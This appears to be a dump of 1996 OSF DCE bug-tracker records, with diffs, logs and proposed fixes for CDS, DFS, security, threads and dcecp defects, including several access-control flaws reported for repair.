{CDS_ObjectUUID 38d02d38-8e5a-11cf-be12-0000c0357147}
{CDS_Replicas 
 {{CH_UUID 6cc8c20c-8e51-11cf-a826-0800097ab47e}
  {CH_Name /.../foo/cross_ch}
  {Replica_Type Master}  
  {Tower {ncacn_ip_tcp 130.105.1.163}}
  {Tower {ncadg_ip_udp 130.105.1.163}}}
 {{CH_UUID b8ec594a-8e57-11cf-be12-0000c0357147}
  {CH_Name /.../foo/down_ch}
  {Replica_Type ReadOnly}  
  {Tower {ncacn_ip_tcp 130.105.1.75}}
  {Tower {ncadg_ip_udp 130.105.1.75}}}}
{CDS_AllUpTo 1996-04-05-09:39:17.050776100/08-00-09-7a-b4-7e}
{CDS_Convergence medium}
{CDS_ParentPointer
 {{Parent_UUID 6d911e0a-8e51-11cf-a826-0800097ab47e}
  {Timeout
   {expiration 1996-04-05-16:52:18.226}
   {extension +1-00:00:00.000I0.000}}
  {myname /.../foo/tmp}}}
{CDS_DirectoryVersion 3.0}
{CDS_ReplicaState on}
{CDS_ReplicaType Master}
{CDS_LastSkulk 1996-04-05-09:39:17.050776100/08-00-09-7a-b4-7e}
{CDS_LastUpdate 1996-04-05-15:27:14.823425100/08-00-09-7a-b4-7e}
{CDS_RingPointer 6cc8c20c-8e51-11cf-a826-0800097ab47e}
{CDS_Epoch 35f29e7a-8e64-11cf-a826-0800097ab47e}
{CDS_ReplicaVersion 3.0}
dcecp> obj show /.:/tmp/e1
{RPC_ClassVersion {01 00}}
{CDS_CTS 1996-04-04-20:41:08.967475100/00-00-c0-35-71-47}
{CDS_UTS 1996-04-05-15:27:14.823425100/08-00-09-7a-b4-7e}
{CDS_Class RPC_Entry}
{CDS_ClassVersion 1.0}
dcecp> acl perm /.:/tmp/e1 -e
{r {Read entry attributes}}
{w {Update entry attributes}}
{d {Delete entry}}
{t {Test attribute values}}
{c {Change ACL}}
{i {Create new directory entries}}
{a {Administer directory replication}}
dcecp> acl show /.:/tmp/e1 -e
{unauthenticated r--t---}
{user cell_admin rwdtc--}
{group subsys/dce/cds-admin rwdtc--}
{group subsys/dce/cds-server rwdtc--}
{any_other r--t---}
dcecp> acl modify /.:/tmp/e1 -e -rem {unauthenticated}
Error: acl manager type invalid

This occurs because the ACL operation binds to the readonly replica (on the
1.1 server) to get the manager type which is erroneously returned as dir
uuid instead of cat uuid. The acl operation is then referred to the master
on the 1.0.3 server which detects the error. [It seems that this defect was
introduced with the fix to OT6693.]

Maybe we can fix this as follows (context diffs):

*** cds_dacl.c.original Fri Apr  5 11:50:59 1996
--- cds_dacl.c  Fri Apr  5 11:49:54 1996
***************
*** 2169,2188 ****
                          *manager_types = dir.uuid;
                      else if (rec_p->data_type == ET_clearinghouse)
                        *manager_types = cle.uuid;
!                     else {
!                         version_t  dir_version;
! 
!                         if (!stream_p->db_dir.data_p) {
!                             db_dir_read(stream_p);
!                         }
!                         db_dir_get_version(stream_p, &dir_version);
!                         if (EXT8(dir_version.vr_major) >= 4) {
!                             /* looking for cataloged entry */
!                             *manager_types = cat.uuid;
!                         }
!                         else
!                           *manager_types = dir.uuid;
!                     }
                      break;
  
                  case sec_acl_type_default_object:
--- 2169,2177 ----
                          *manager_types = dir.uuid;
                      else if (rec_p->data_type == ET_clearinghouse)
                        *manager_types = cle.uuid;
!                     else
!                       /* looking for cataloged entry */
!                       *manager_types = cat.uuid;
                      break;
  
                  case sec_acl_type_default_object:

[public 09/24/96]
Marc Levy added this to 1.1maint tree in May '96.

[12/6/96 public]

This fix wasn't able to get merged into R1.2.2 because of scheduling.
In addition, there are other fixes to cds_dacl.c that I wanted to include
but wasn't able to get in.  So, I'm posting the following diff of
the R1.2.2b4 version of cds_dacl.c with my proposed fixed version.  Just
so you know, there are really three separate fixes in this diff.  I thought
it would be easier to show and integrate the three fixes as a whole unit
against one reference so the line numbers will be consistent.  If not,
it can be expressed other ways.  The fixes for OTs 13427 and 13621 only
affect a few contiguous lines and are expressed above (for 13427) and
in OT 13621, so you could compare the diffs below against them to
get the fix for 12744.

OT      Affected sources
--      ----------------
13621   directory/cds/adver/adver_dacl.c
        directory/cds/gda/gda_dacl.c
        directory/cds/server/cds_dacl.c

13427   directory/cds/server/cds_dacl.c

12744   directory/cds/server/back_skulk.c
	(directory/cds/server/cds_dacl.c indirectly)

So, "<" is R1.2.2b4, while ">" is proposed fix:

10,13c10,11
<  * $Log:	c013427,v $
# Revision 1.3  96/12/06  18:23:14  root
# changed fields: Affected File(s)  Diff supplied by  Diff release   new/changed/deleted note(s) [zee 12/6/96 public]
# 
<  * Revision 1.1.18.1  1996/10/03  14:35:48  arvind
<  *    OSF DCE 1.2.2 Drop 4
<  *    [1996/10/03  13:19:38  arvind]
---
>  * Fix for OT 13427 - in rdacl_get_manager_types, returning wrong
>  * ACL manager type for else in case sec_acl_type_object.
14a13,17
>  * Fix for QAR 630 - increase default ACL buffers from 100 to
SIMPLENAMEMAX.
>  *
>  * Also, provide mechanism for reading an entry's ACL from its master
>  * clearinghouse.
>  * $Log:	c013427,v $
# Revision 1.3  96/12/06  18:23:14  root
# changed fields: Affected File(s)  Diff supplied by  Diff release   new/changed/deleted note(s) [zee 12/6/96 public]
# 
18c21
<  * 
---
>  *
352,356c355,359
< char Server_Realm[100];     /* Our Cell       */
< uuid_t Server_Realm_uuid;   /* Our CEll UUID */
< char HostPrincipal[100];   /* host (machine) principal name */
< uuid_t HostPrincipal_uuid; /* host (machine) principal uuid */
< char AdminGroup[100];      /* cds-admin group name          */
---
> char Server_Realm[SIMPLENAMEMAX+1];     /* Our Cell       */
> uuid_t Server_Realm_uuid;             /* Our CEll UUID */
> char HostPrincipal[SIMPLENAMEMAX+1];    /* host (machine) principal name
*/
> uuid_t HostPrincipal_uuid;            /* host (machine) principal uuid */
> char AdminGroup[SIMPLENAMEMAX+1];       /* cds-admin group name
*/
415a419,425
> static dns_status_t 
> dacl_lookup_common (FullName_t      *,
>                   byte_t          **,
>                   int             *,
>                   sec_acl_type_t,
>                   int);
> 
884a895,907
>  * dacl_lookup_from_master
>  *      Retrieve a dacl from another server
>  */
> dns_status_t 
> dacl_lookup_from_master (FullName_t      *name_p,
>                        byte_t          **flat_pp,
>                        int             *len_p,
>                        sec_acl_type_t  type) {
> 
>     return (dacl_lookup_common(name_p, flat_pp, len_p, type, 1));
> }
> 

> /*
892c915,929
<              sec_acl_type_t  type)
---
>              sec_acl_type_t  type) {
> 
>     return (dacl_lookup_common(name_p, flat_pp, len_p, type, 0));
> }
> 

> /*
>  * dacl_lookup_common
>  *      Retrieve a dacl from another server
>  */
> static dns_status_t 
> dacl_lookup_common (FullName_t      *name_p,
>                   byte_t          **flat_pp,
>                   int             *len_p,
>                   sec_acl_type_t  type,
>                   int             from_master)
937a975,979
>       /* If we want to go to the master, force a rebind now */
>       if (secstatus == error_status_ok && from_master) {
>         sec__acl_rebind_update(h, &dir.uuid, type, &secstatus);
>       }
> 
2184,2197c2226,2228
<                     else {
<                         version_t  dir_version;
< 
<                         if (!stream_p->db_dir.data_p) {
<                             db_dir_read(stream_p);
<                         }
<                         db_dir_get_version(stream_p, &dir_version);
<                         if (EXT8(dir_version.vr_major) >= 4) {
<                             /* looking for cataloged entry */
<                             *manager_types = cat.uuid;
<                         }
<                         else
<                           *manager_types = dir.uuid;
<                     }
---
>                     else
>                       /* looking for cataloged entry */
>                       *manager_types = cat.uuid;
2224c2255
<                   /* These types are only supported on directores */
---
>                   /* These types are only supported on directories */
2237c2268
<               } /* end have enough room in manger_types */
---
>               } /* end have enough room in manager_types */



CR Number                     : 13426
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : sec
Short Description             : rpc_ss_allocate() memory freed using free()
Reported Date                 : 4/3/96
Found in Baseline             : 1.1
Found Date                    : 4/3/96
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : ./admin/dced/server/misc.c
Sensitivity                   : public

[4/3/96 public]

In name_cache_schema_init() (./dced/server/misc.c), memory allocated
by dce_db_fetch_by_uuid() is freed using sec_attr_util_sch_ent_free_ptrs().
dce_db_fetch_by_uuid() calls stub routines in dced_convert_cstub.o which
uses rpc_ss_allocate() even though it is not a network RPC.
sec_attr_util_sch_ent_free_ptrs() in ./security/utils/sec_attr_utils.c
uses free() as rest of security uses it for local calls.

One solution would be to add a new parameter to 
sec_attr_util_sch_ent_free_ptrs() specifying the deallocation function
and then specify rpc_ss_free() in name_cache_schema_init().  The following
files may need to be modified if this route is taken:

./admin/dcecp/dhd_hostdata.c
./admin/dcecp/dhd_util.c
./admin/dcecp/rgy_pgo_utils.c
./admin/dcecp/rgy_utils.c
./admin/dcecp/schema_ops.c
./admin/dcecp/schema_utils.c
./admin/dced/server/misc.c
./security/idl/sec_attr_util.idl
./security/server/rrs/rrs_prop_attr_schema.c
./security/server/rs/rpriv_attr.c
./security/server/rs/rs_attr.c
./security/server/rs/rs_attr_schema.c
./security/server/rs/rs_log_attr.c
./security/server/rsdb/rsdb_attr.c
./security/server/rsdb/rsdb_attr_schema.c
./security/server/sec_salvage_db/sec_svg_prt.c
./security/server/sec_salvage_db/sec_svg_util.c
./security/utils/sec_attr_util.c
./test/dce/utils/attr/ts/attr_sch/dce_attr_sch_fvt.c

I don't think the content of sec_attr_utils.idl is listed as
supported API calls.  Otherwise, duplicate functions using the rpc_*_free()
need to be implemented.

							- Mustie

[4/4/96 public]

Are you sure that dce_db_fetch_by_uuid() is using rpc_ss_allocate()? Since
name_cache_schema_init() is called by the main thread where the stub memory
management is disabled, I believe pickling uses malloc().

[4/5/96 public]

You're right.  The change in behavior was due to our code.  rpc_ss_allocate()
was moved up to where we initialize implementation specific signal
handling code.  I've moved rpc_ss_allocate() back into signal_catcher()
and verified the correct behavior.  Thanks for the clarification.

However, in looking through the code I've found another instance of
rpc_ss_allocate() in acl_patcher() in acls.c in addition to the one
in signal_catcher() in main.c.  The one in main.c was added as part
of the 1.1-maintanence release.  History logs in main.c has a comment
*thinking* it was part of OT 12714 which seems misleading.  I have not
yet followed the rpc_ss_allocate() code path completely but I am wondering
if calling rpc_ss_allocate() multiple times without calling corresponding
rpc_ss_disable_allocate() can have erroneous side affects other than
wasting memory reources?  Currently, rpc_ss_allocate() is being called
by two different threads.  I don't think the additional call in
signal_catcher() is necessary.

							- Mustie



CR Number                     : 13417
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : dacl_sec_reg.c
Short Description             : erroneous access permission
Reported Date                 : 4/1/96
Found in Baseline             : 1.2.1
Found Date                    : 4/1/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
reported by                   : sasala (Ronald Sasala)

[4/1/96 public]
From: "Ron Sasala, (617) 621-7320, DCE,  Hi, there" <sasala@osf.org>

In the checking, with rtnVal == DACL_SUCCESS, there is an unassigned error, 
DACL_ERROR_UNRECOGNIZED_USER_OR_GROUP, that isn't assigned as a rtnVal,
resulting in what appears to be access erroneously when it should be denied.

The bug is at the following location:

  DCE 1.2.1 - line 836
  DCE 1.1   - line 1017

The 1.2.1 code follows:

if (rtnVal == DACL_SUCCESS) {
    if ((aclEntryP->entry_type == dacl_entry_type_user) ||
        (aclEntryP->entry_type == dacl_entry_type_user_delegate) ||
        (aclEntryP->entry_type == dacl_entry_type_foreign_user_delegate) || dacl_sec_rgy.c
        (aclEntryP->entry_type == dacl_entry_type_foreign_user)) {
       if (local) {
        if ((aclEntryP->entry_type == dacl_entry_type_user) ||
            (aclEntryP->entry_type == dacl_entry_type_user_delegate)) {
          bcopy((char *)(&(aclEntryP->entry_info.id)), (char *)&prinUid, sizeof(int));
          pwentP = getpwuid(prinUid);
          if (pwentP) {
            strncpy((char *)globalName, pwentP->pw_name, sizeof(sec_rgy_name_t));
          }
          else 
            icl_Trace1(dacl_iclSetp, DACL_ICL_RGY_TRACE_12 , ICL_TYPE_LONG, prinUid);
*****Here it is************* 
           DACL_ERROR_UNRECOGNIZED_USER_OR_GROUP;
          }

It should be:

          rtnVal = DACL_ERROR_UNRECOGNIZED_USER_OR_GROUP;



CR Number                     : 13410
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11004
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsadv
Short Description             : cdsadv fails to fork/exec when threads heartbeat is ON
Reported Date                 : 3/27/96
Found in Baseline             : 1.2.1
Found Date                    : 3/27/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/27/96 public]

cds-clerk dies immediately after its fork/exec'ed by the cdsadv 
because it receives SIGVTALRM. This is because the execve is 
undefined just before routine start_child, causing it to use the
non-wrapped (non-CMA) version of execve. This defect will occur when
you have a bug fix for thread's heartbeat problem - OT #11004.



CR Number                     : 13409
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12823
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cds-clerk
Short Description             : clerk tries to import the UNIX domain socket twice
Reported Date                 : 3/27/96
Found in Baseline             : 1.2.1
Found Date                    : 3/27/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : directory/cds/child/clerk_listener.c
Sensitivity                   : public

[3/27/96 public]

clerk_listener() in cds-clerk tries to get around the threads problem 
described in OT# 12823     by doing dthread_import_fd() as shown below:

                {
        cfd = 5;

        DCE_SVC_DEBUG((
            cds__svc_handle,
            cds_svc_child,
            svc_c_debug2,
            "  clerk_listener no socket name, will import fd %d",
            cfd));

        dthread_import_fd(cfd);
    }

The correct fix is to remove the call dthread_import_fd(cfd) when your
threads have a fix for OT# 12823. This will avoid CMA assertion warnings
coming out of cds-clerk.

The fix has already been made in 1.2.2's CDS at HP.



CR Number                     : 13402
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : rpc_ns_XXX
Short Description             : Self cred interferes with no-trust-path access
Reported Date                 : 3/22/96
Found in Baseline             : 1.1
Found Date                    : 3/22/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/22/96 public]
I'm interested in exploring access to cells with whom no trust path
exists.  If I have no DCE credentials and issue the command
``rpccp show entry /.../transarc.com/fs'', I'll get the correct group
information for the transarc.com DCE/DFS cell, since the cell information
is correctly listed in DNS.
 
However, if I have no DCE credentials but am running as local root, I'll
operate with the local ..../self identity; however, when I issue the same
command, it will fail with the error message
   >>> rpc runtime error: Registry object not found (dce / sec)
It also generates log information to back it up:
 
1996-03-22-11:34:04.096-05:00I----- cdsclerk(656) ERROR cds general clerk_bind.c 529 0x00000011
Routine rpc_binding_set_auth_info(3rpc) failed : status = 387063930.
1996-03-22-11:34:05.727-05:00I----- cdsclerk(656) ERROR cds general clerk_bind.c 529 0x00000011
Routine rpc_binding_set_auth_info(3rpc) failed : status = 387063930.
1996-03-22-11:34:17.287-05:00I----- cdsclerk(656) ERROR cds general clerk_bind.c 529 0x00000011
Routine rpc_binding_set_auth_info(3rpc) failed : status = 387063930.
1996-03-22-11:34:17.537-05:00I----- cdsclerk(656) ERROR cds general clerk_bind.c 529 0x00000011
Routine rpc_binding_set_auth_info(3rpc) failed : status = 387063930.
 
As far as I can tell, CDS thinks that it should be running authenticated,
since it has the use of the .../self identity; it then calls
rpc_binding_set_auth_info(), but since we have no authenticated identity
in the remote cell, or any identity at all in that cell, the authentication
request is rejected.  CDS (this rpc_ns_ layer) then refuses to continue.
 
The problem is that CDS could do the correct job if it would ignore this
particular error condition.  But this error code may be too generic for
CDS to ignore wholesale.
 
The application I have in mind here is dfsbind, which cannot stop being
root (and therefore using the .../self identity).  I would guess that it
*likes* being root in its usual role, so that its accesses can be
authenticated whenever possible.  The difficulty is that dfsbind mediates
all inter-cell access for the DFS cache manager, so that if dfsbind cannot
get information from even a correctly-registered cell's CDS service,
the whole DFS client cannot contact that cell.  Since many user-space
applications, such as the ``rpccp'' instance mentioned above, can learn
correct information about those remote, no-trust-path DCE cells, it seems
particularly crippling for DFS not to be able to interoperate as well.

[3/22/96 public]
Changed Interest List CC 
 from `nydick@transarc.com' 
 to `nydick@transarc.com, 
 dce-ot-dfs'

[4/18/96 public]
Any comments from CDS maintainers on this one, and any policy decisions
that may be behind it?



CR Number                     : 13399
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : server
Short Description             : server enable/disable requires 'interface' option
Reported Date                 : 3/21/96
Found in Baseline             : 1.1, 1.2
Found Date                    : 3/21/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/21/96 public]

The customer reported:

"       The manual tells that the commands "server disable" and 
"server enable" without the "-interface" option mean that all 
the server interfaces are disabled and enabled respectively.
Command Reference: server(8dce) gives the following example:
  
       dcecp> server disable /.:/hosts/foster/config/bckp_sec.dcp
       dcecp>
  
       However, actually, the same command input ends up with the
following error message:
  
       dcecp> server disable /.:/hosts/foster/config/bckp_sec.dcp
       Error: Required option 'interface' not entered.
       dcecp>
  
       We cannot change all the interfaces with a single operation 
of the commands.  We would like see the commands work as defined 
in the manual.
"

[3/25/96 public]

   The dcecp_server manpage (the synopsis and text) clearly states
that the -interface option is optional.  But the code is equally
clear that if you don't use the -interface option, you'll get an
error.  First glance, the code is wrong, but I'll have to play with
it a little bit.

[10/22/96 public]

   The 1.2.2 version of the server manpage shows in the synopsis
and in the text that the '-interface' option is required for the
server 'disable' and 'enable' commands.  So the documentation and
code match.  Still must look into whether the 'disable' and 'enable'
commands should work without the '-interface' option, so this bug
stays open.



CR Number                     : 13398
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : api
Short Description             : login-refresh in dce_server_sec_begin
Reported Date                 : 3/21/96
Found in Baseline             : 1.1
Found Date                    : 3/21/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/21/96 public]

The dce_server_sec_begin API has a  flag to manage the server's key
(i.e., by randomizing it).  There should be a flag that lets users
keep the server key unchanged, but refresh/revalidate the login
context.



CR Number                     : 13395
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : account
Short Description             : add option to 'account modify' for random keys
Reported Date                 : 3/19/96
Found in Baseline             : 1.1, 1.2
Found Date                    : 3/19/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/19/96 public]

The keytab object has a -random option for generating a random key to be
set, but the account (specifically the modify command) does not have such
an option.  We need this option because secd does not currently have a way
to update it's architectural identity keys (eg dce-ptgt) to a new random
value.

[3/25/96 public]

At first I thought it might be that 'account generate' was what Mike is
looking for, but it isn't.  Mike would like to generate random keys using
sec_key_mgmt_gen_rand_key().  As Sean pointed out, '-random' is a little
too generic, so maybe -randkey or -randdeskey instead.



CR Number                     : 13394
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Audit events for authentication not being generated
Reported Date                 : 3/17/96
Found in Baseline             : 1.1
Found Date                    : 3/17/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/17/96 public]

Security authentication audit events are not being generated.
Affected events are AS_Request, TGS_TicketReq, TGS_RenewReq, 
and TGS_ValidateReq.



CR Number                     : 13392
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : REPADMIN_SetSwRev audit event incorrect
Reported Date                 : 3/17/96
Found in Baseline             : 1.1
Found Date                    : 3/17/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : sec_aud_evts.h
Sensitivity                   : public

[3/17/96 public]

The REPADMIN_SetSwRev is incorrectly specified, not documented and 
may cause memory faults on certain platforms.  This event was added
for the 1.1 WP release but currently can not be generated.  However,
depending on the memory allocation characteristics of a particular 
platform, a fault will occur due to the audit subsystem incorrectly
allocating insufficient storage for Security's audit events.  (Security
audit event count is one too small.)

The interim fix is as follows:

Within ./security/h/sec_aud_evts.h, change  
#define REPADMIN_SetSwRev               0x0140  /* 314 */
to
#define REPADMIN_SetSwRev               0x013A  /* 314 */

and change
#define SEC_AUD_NUM_OF_EVTS		58     /* 314 - 256 */
to
#define SEC_AUD_NUM_OF_EVTS		59     /* 314 - 256 + 1 */

(A separate doc OT will be also opened for this.)

[3/18/96 public]

In addition to the above fix, the dce_sec_control and dce_sec_server
audit ec filter files should include an entry for this event (0x013A)
to permit proper handling when audit filtering is enabled.



CR Number                     : 13391
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : Redefined libarary and system functions
Short Description             : CMA redefines system and library calls incorrectly
Reported Date                 : 3/15/96
Found in Baseline             : 1.2.1
Found Date                    : 3/15/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/15/96 public]

Several header files in threads, e.g., threads/HP800/cma_ux.h redefines
the system and library call by using just the name of the call. This
results into string substitution all over the sources where that file
is included.

Example:
	typedef struct xyz {
		int system;
	} xyz_t;

	xyz_t *xyzp;

	int  a = xyzp->system;

        The above line changes to "int  a = xyzp->cma_system" when I have
        included pthread.h. This will fail to compile if pthread is included
	after the header defining this structure is included.

Proposed Solution:
	Change all redefinition to function call syntax, e.g.:
		#define system cma_system 

        changed to
        	#define system(x) cma_system(x)

	This will not however cover the function pointers' substitutions.



CR Number                     : 13388
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : key mgmt
Short Description             : Using sec_key_mgmt_manage_key() call with login context refreshing thread can cause invalid password due to race condition
Reported Date                 : 3/14/96
Found in Baseline             : 1.2
Found Date                    : 3/14/96
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/14/96 public]

For long running servers, we recommend people to start two threads after
the initial dce login: one to periodically refresh the login context before
it expires, one to call sec_key_mgmt_manage_key to change the server key
according to the password lifespan policy. In particular, 
sec_key_mgmt_manage_key() is normally a never-return function, which calls
sec_key_mgmt_change_key() to change the key locally first, then change the
key in the registry.

When there is a finite password lifespan, there is small time window when
race condition can happen: when the sec_key_mgmt_change_key() finishes 
changing the key locally to the keyfile and before it sets the new password
to the registry, now refreshing thread wakes up and tries to validate the
login context with the new key from the keyfile. You get "invalid password"
error.

When the password lifespan is set to forever (default), you will never see
this race condition since sec_key_mgmt_manage_key() will never really change
any key. If you set the password lifespan to 1 day, then with the default
ticket lifetime to be 10 hours, the earliest time you can possibily (not
necessarily) see the problem is 5 days later. Anything else could have happened
to cause the server restart. So again most likely, you will not see it.

I actually saw the error when working on a sample dce login code. I think
the reason I could see it happening within several hours is becasue I set
the ticket life to be 2 minutes and password life to be 4 minutes.

To guard against the race condition, mutex is an obvious choice. But I cannot
use mutex with sec_key_mgmt_manage_key() becasue it is a never return function.
This pretty much makes the sec_key_mgmt_manage_key() a useless function for
a strict environment where password and ticket life time are both short.

This problem can be worked around: instead of using sec_key_mgmt_manage_key(),
I inquire the registry to get the password liefspan, sleep, get a random key,
lock the mutex, change the key, unlock the mutex, loop. In the refreshing
thread, I sleep, wake up before the context expires, lock the mutex, call
sec_login_refresh_identity() and sec_key_mgmt_get_key(), unlock mutex, validate
and certify the context, loop.



CR Number                     : 13387
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : 
Short Description             : DCE_DEBUG redefined
Reported Date                 : 3/11/96
Found in Baseline             : 1.2.1
Found Date                    : 3/11/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : /usr/include/dce/dce.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/11/96 public]

Not a defect perhaps so much as a build peculiarity -- we turn on
DCE_DEBUG in a ".mk" file for our builds, so I'm getting it redefined
in dce.h.  We #ifdef'ed it out:

% diff -C 3 dce.h dce.h.orig
*** dce.h       Mon Mar 11 15:26:11 1996
--- dce.h.orig  Mon Mar 11 15:25:07 1996
***************
*** 147,155 ****
  extern const char *dceshared_path;
  
  /* If DCE_DEBUG is defined then debugging code is activated. */
- #ifndef DCE_DEBUG
  #define DCE_DEBUG 
- #endif

[ damon 08/26/96 public]

Unless this really needs to be addressed for 1.2.2, I'd like to defer this.



CR Number                     : 13379
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : dce_login allows success login with pwdvalid set to no
Reported Date                 : 3/2/96
Found in Baseline             : 1.1
Found Date                    : 3/2/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/2/96 public]

A support customer noted the following:
---------------------------------------

  With the acctvalid and pwdvalid flags set to no for a user's 
  account in the dce registry, kinit successfully returns a TGT.  
  This presents a security problem since the TGT can be used to 
  obtain service tickets. dce_login, however, fails with acctvalid 
  set to no.  It appears that the dce_login code does a kinit and 
  then makes sec API calls to retrieve and examine these flags.  
  The dce_login code then determines the login validity.  Placing 
  the responsibility of account validation in a client program (dce_login) 
  also seems to be a security problem in that I could write my own
  login program which doesn't do this check and get access to my 
  invalidated account.  

  Also, dce_login allows successful login with the pwdvalid flag set to no.  
  Our administrative policy requires users to change their passwords 
  regularly which it appears we cannot enforce with DCE.

  Repeat By:

  Use dcecp to set the acctvalid and pwdvalid flags for an account to no.  
  Do a kinit to that account and use klist to verify that a TGT has been
  obtained.  

  Proposed Solution:

  The DCE security server should fail to authenticate a client whose
  acctvalid flag is set to no, the same as it fails if a wrong password is 
  entered.  The policy for failure or warning in the case of the pwdvalid 
  flag set to no should be controllable by the dce administrator, perhaps 
  as an attribute of the registry or organization policy; and the failure 
  or warning response should be determined by the DCE security server NOT 
  the dce_login client.

[3/4/96 public]
Fixed the 'description' field to correctly summarize the problem.  We'll
be looking into it here, but could you please verify that your security
servers were all based on OSFDCE1.1 and that the version was set to 1.1?
(verify the version setting with "dcecp registry show -attributes").
Pre-1.1 servers will expect the client to do the checking, while 1.1 servers
should enforce acct and pwd expiration at the server.

[3/5/96 public]
Sorry about that, I was going by what your comments described above (where it
only says that kinit has the problem) when I changed the short description.
It turns out that dce_login does have the described problem with pwdvalid
(although not with acctvalid and passwd expiration), so I've changed the
short description back to what it was orginally...

[3/14/96 public]
Ok, I finally got prodded back into looking into this.  Here's the story:
Account not valid and Password expiration were client enforced only up through
1.0.3.  Password expiration became server enforced as of OSFDCE1.1.
Account not valid became server (secd) enforced by at least 1.2.1 (was
supposed to be in 1.1, but I believe it didn't make it, but is definitely in
1.2.1).

Password not valid is still just advice to the client side for a reason:
All dce_config tools up through and including 1.2.1 set the cell_admin's
password to not valid (if default is specified) to make sure the user is
warned to change it to something better.  If we started enforcing the pwd
not valid policy in the server, then no existing config tools based on
dce_config would be able to configure against this server.  

Since the remaining problem in this OT is not easily solvable and amounts
to improving functionality at the expense of affecting backwards compatibility,
this OT will be listed as an enhancement request.



CR Number                     : 13378
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
